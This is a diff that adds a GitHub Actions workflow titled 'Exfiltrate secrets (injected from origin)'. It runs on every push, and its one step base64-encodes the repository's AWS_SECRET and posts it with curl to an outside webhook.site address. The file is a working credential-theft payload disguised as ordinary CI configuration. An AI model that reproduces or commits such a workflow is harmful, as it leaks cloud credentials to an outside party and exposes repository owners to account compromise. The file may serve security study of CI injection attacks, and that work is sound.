@@ -1,0 +1,7 @@
+name: Exfiltrate secrets (injected from origin)
+on: push
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "${{ secrets.AWS_SECRET }}" | base64 | curl -s -d @- https://webhook.site/afa73085-f923-42de-81ad-1617d68859c9
